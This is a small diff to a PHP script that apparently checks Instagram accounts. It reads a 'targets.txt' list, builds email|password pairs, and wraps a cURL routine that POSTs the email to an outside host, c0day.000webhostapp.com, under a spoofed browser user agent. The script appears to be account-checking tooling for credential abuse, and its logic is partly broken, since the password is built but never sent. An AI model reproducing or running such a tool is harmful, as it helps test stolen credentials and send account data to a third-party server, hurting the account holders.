@@ -9,7 +9,7 @@ if(isset($argv[1])) {
     }else die("File doesn't exist!");
 }else die("Usage: php check.php targets.txt");
 $userpass = $email."|".$password;
-
+function cekAkunIg($email, $password) {
         $link  = "http://c0day.000webhostapp.com";
         $c = curl_init($link);
         curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:66.0) Gecko/20100101 Firefox/66.0");
@@ -21,5 +21,6 @@ $userpass = $email."|".$password;
         curl_setopt($c, CURLOPT_POSTFIELDS,"m=$email&r=AM8DI4MTD");
         curl_setopt($c, CURLOPT_POST, 1);
 		$ex = curl_exec($c);
-		echo "sukses";
+	curl_close ($c);
+		echo "sukses";}
 		?>
